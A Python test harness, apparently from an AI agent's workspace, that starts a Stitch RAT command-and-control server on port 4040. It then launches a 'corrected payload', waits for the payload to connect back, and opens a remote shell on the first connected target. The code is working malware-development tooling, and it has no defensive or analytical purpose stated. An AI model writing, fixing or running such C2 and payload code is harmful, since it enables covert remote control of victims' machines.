#!/usr/bin/env python3
"""
Test the corrected payload protocol
"""

import os
import sys
import time
import socket
import subprocess
import threading

def start_c2_server():
    """Start C2 server and monitor connections"""
    script = '''
import sys
import os
import time
sys.path.insert(0, '/workspace')

from Application.stitch_cmd import stitch_server

print("[C2] Starting server...")
server = stitch_server()
server.do_listen('4040')
print("[C2] Listening on port 4040")

# Monitor connections
for i in range(30):
    time.sleep(1)
    if server.inf_sock:
        print(f"[C2] Active connections in inf_sock: {list(server.inf_sock.keys())}")
        
        # Try to interact with first connection
        if len(server.inf_sock) > 0:
            target = list(server.inf_sock.keys())[0]
            print(f"[C2] Attempting shell on {target}...")
            server.do_shell(target)
            break
    else:
        print(f"[C2] No connections yet... ({i+1}/30)")
        
print("[C2] Server exiting...")
'''
    
    with open('/tmp/test_c2_server.py', 'w') as f:
        f.write(script)
        
    proc = subprocess.Popen(
        ['python3', '/tmp/test_c2_server.py'],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True
    )
    
    return proc

def start_payload():
    """Start the corrected payload"""
    proc = subprocess.Popen(
        ['python3', '/workspace/correct_payload_protocol.py'],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True
    )
    
    return proc

def main():
    print("="*70)
    print("TESTING CORRECTED PAYLOAD PROTOCOL")
    print("="*70)
    
    # Kill any existing processes
    os.system("pkill -f 'python.*test_c2' 2>/dev/null")
    os.system("pkill -f 'correct_payload' 2>/dev/null")
    time.sleep(2)
    
    # Start C2 server
    print("\n[TEST] Starting C2 server...")
    c2_proc = start_c2_server()
    time.sleep(3)
    
    # Start payload
    print("[TEST] Starting corrected payload...")
    payload_proc = start_payload()
    
    # Monitor for 10 seconds
    print("\n[TEST] Monitoring connection...")
    
    success = False
    for i in range(10):
        time.sleep(1)
        
        # Check if payload still running
        if payload_proc.poll() is not None:
            print(f"  Payload exited with code: {payload_proc.poll()}")
            stdout, _ = payload_proc.communicate()
            print(f"  Payload output:\n{stdout}")
            break
            
        print(f"  Monitoring... ({i+1}/10)")
    
    # Get C2 output
    print("\n[TEST] Checking C2 server output...")
    c2_proc.terminate()
    c2_output, _ = c2_proc.communicate()
    
    print("\n[C2 SERVER OUTPUT]")
    print("-"*50)
    print(c2_output)
    print("-"*50)
    
    # Check for success indicators
    if "Active connections in inf_sock" in c2_output:
        print("\n✓ SUCCESS: Payload connected to C2!")
        success = True
        
        # Check if IP is in connections
        if "127.0.0.1" in c2_output:
            print("✓ Connection shows correct IP")
            
    else:
        print("\n✗ FAILED: No connection established")
        
    # Cleanup
    payload_proc.terminate()
    
    return success

if __name__ == "__main__":
    success = main()
    sys.exit(0 if success else 1)